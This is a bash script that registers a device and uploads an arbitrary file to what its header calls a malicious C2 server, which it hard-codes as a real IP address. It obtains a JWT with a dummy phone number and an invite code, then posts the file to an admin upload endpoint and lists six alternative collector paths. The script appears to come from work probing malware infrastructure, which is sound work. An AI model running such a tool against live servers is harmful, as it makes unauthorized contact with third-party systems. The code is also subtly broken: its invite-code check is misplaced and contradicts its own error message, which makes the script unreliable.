#!/usr/bin/env bash
# upload_photo.sh – register (optional) and upload a file to the malicious C2 upload pipeline.
# --------------------------------------------------------------
# Usage:
#   ./upload_photo.sh <file_path> [-u <c2_base_url>] [-t <jwt>] [-i <invite_code>]
#
#   <file_path>      Path to the image (or any file) to upload.
#   -u <c2_base_url>   Base URL of the C2 server (default http://66.212.59.162).
#   -t <jwt>            Admin Bearer token for panel upload. If omitted the script will try device registration (which does NOT work for panel upload).
#   -i <invite_code>    Invite code for registration (4‑ or 6‑digit numeric; required when -t is omitted).
# --------------------------------------------------------------

set -euo pipefail

# Default values (may be overridden by flags)
BASE_URL="http://66.212.59.162"
JWT=""
INVITE_CODE=""
FILE=""

# Parse optional flags (order‑independent). Anything that is not a flag is taken as the file path.
while [[ "$#" -gt 0 ]]; do
  case "$1" in
    -u)
      BASE_URL="$2"
      shift 2
      ;;
    -t)
      JWT="$2"
      shift 2
      ;;
    -i)
      INVITE_CODE="$2"
      shift 2
      ;;
    --)
      shift
      break
      ;;
    -*)
      echo "Invalid option: $1" >&2
      exit 1
      ;;
    *)
      if [[ -z "$FILE" ]]; then
        FILE="$1"
      else
        echo "Unexpected extra argument: $1" >&2
        exit 1
      fi
      shift
      ;;
  esac
done

if [[ -z "$FILE" ]]; then
  echo "Error: missing <file_path>"
  echo "Usage: $0 <file_path> [-u <c2_base_url>] [-t <jwt>] [-i <invite_code>]"
  exit 1
fi

if [[ ! -f "$FILE" ]]; then
  echo "Error: file not found – $FILE" >&2
  exit 1
fi

# --------------------------------------------------------------
# 1️⃣ Register (if no JWT supplied)
# --------------------------------------------------------------
if [[ -z "$JWT" ]]; then
  # Invitation code must be supplied when we need to register
  if [[ -z "$INVITE_CODE" ]]; then
    echo "[-] Invite code is required for registration (-i)" >&2
    exit 1
  fi
  REG_ENDPOINT="/s/qb16jb/l1jrxodp/htxzq8o846"
  PHONE="8613800138000"   # dummy phone, any valid MSISDN works
  echo "[*] Registering device to obtain JWT …"
  REG_RESP=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "{\"phone\":\"$PHONE\",\"invite_code\":\"$INVITE_CODE\"}" \
        "$BASE_URL$REG_ENDPOINT")
  # Extract token – support both {\"token\":...} and {\"data\":{\"token\":...}}
  JWT=$(echo "$REG_RESP" | python3 -c "import sys,json;obj=json.load(sys.stdin);print(obj.get('token') or (obj.get('data') or {}).get('token') or '')")
# Validate invite code format (4‑digit numeric) if supplied
if [[ -n "$INVITE_CODE" && ! "$INVITE_CODE" =~ ^[0-9]{4,6}$ ]]; then
  echo "[-] Invite code must be a 4‑digit number" >&2
  exit 1
fi

if [[ -z "$JWT" ]]; then
    echo "[-] Failed to obtain JWT – server response:" >&2
    echo "$REG_RESP" >&2
    exit 1
  fi
  echo "[+] JWT obtained"
fi

# Ensure we have a JWT for the panel upload (admin token). If empty, abort.
if [[ -z "$JWT" ]]; then
  echo "[-] No JWT provided and registration did not produce a usable admin token. Provide a valid admin token via -t." >&2
  exit 1
fi

# --------------------------------------------------------------
# 2️⃣ Choose an upload pipeline path (first of the 7 static paths)
# --------------------------------------------------------------
UPLOAD_PATH="/manage/config/upload-image"
# If you need a different collector, replace the path above with any of:
#   /s/zvftch/wy68cf2y/w7vkow5706
#   /s/yc2b4v/yu8c6vmq/ksk74g362h
#   /s/uy6qd4/urqraqxc/tdm7d6ky9w
#   /s/dhe4wk/7qev4ukj/tmtnqihcg2
#   /s/1yshe5/vkxjz45i/2hyv9rgymt
#   /s/zufrnc/wi71ztmt/6c629lxrkf

# --------------------------------------------------------------
# 3️⃣ POST the file
# --------------------------------------------------------------
echo "[*] Uploading $(basename "$FILE") → $BASE_URL$UPLOAD_PATH"
UPLOAD_RESP=$(curl -s -X POST \
    -H "Authorization: Bearer $JWT" \
    -F "file=@$FILE" \
    "$BASE_URL$UPLOAD_PATH")

echo "Server reply:"
echo "$UPLOAD_RESP"
